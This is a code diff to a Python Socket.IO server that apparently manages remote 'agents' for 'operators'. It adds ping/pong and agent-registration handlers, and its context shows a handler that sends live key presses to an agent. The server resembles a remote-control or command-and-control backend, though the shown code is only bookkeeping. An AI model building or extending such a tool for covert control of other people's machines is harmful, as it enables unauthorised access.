@@ -2839,6 +2839,63 @@ def handle_agent_heartbeat(data):
     if agent_id in AGENTS_DATA:
         AGENTS_DATA[agent_id]['last_seen'] = datetime.datetime.utcnow().isoformat() + 'Z'
 
+@socketio.on('ping')
+def handle_ping(data):
+    """Handle ping from agent and respond with pong"""
+    agent_id = data.get('agent_id')
+    timestamp = data.get('timestamp')
+    uptime = data.get('uptime', 0)
+    
+    # Update agent data if it exists
+    if agent_id in AGENTS_DATA:
+        AGENTS_DATA[agent_id]['last_seen'] = datetime.datetime.utcnow().isoformat() + 'Z'
+        AGENTS_DATA[agent_id]['uptime'] = uptime
+    
+    # Send pong response
+    emit('pong', {
+        'agent_id': agent_id,
+        'timestamp': timestamp,
+        'server_time': datetime.datetime.utcnow().isoformat() + 'Z',
+        'status': 'ok'
+    })
+    print(f"Ping received from {agent_id}, sent pong")
+
+@socketio.on('agent_register')
+def handle_agent_register(data):
+    """Handle agent registration"""
+    agent_id = data.get('agent_id')
+    platform = data.get('platform', 'unknown')
+    python_version = data.get('python_version', 'unknown')
+    timestamp = data.get('timestamp')
+    
+    if not agent_id:
+        emit('registration_error', {'message': 'Agent ID required'})
+        return
+    
+    # Add agent to data
+    AGENTS_DATA[agent_id] = {
+        'agent_id': agent_id,
+        'platform': platform,
+        'python_version': python_version,
+        'connected_at': datetime.datetime.utcnow().isoformat() + 'Z',
+        'last_seen': datetime.datetime.utcnow().isoformat() + 'Z',
+        'status': 'online',
+        'sid': request.sid,
+        'uptime': 0
+    }
+    
+    # Notify operators
+    emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
+    
+    # Send registration confirmation
+    emit('agent_registered', {
+        'agent_id': agent_id,
+        'status': 'success',
+        'message': 'Agent registered successfully'
+    })
+    
+    print(f"Agent registered: {agent_id} ({platform})")
+
 @socketio.on('live_key_press')
 def handle_live_key_press(data):
     """Operator sends a live key press to an agent."""
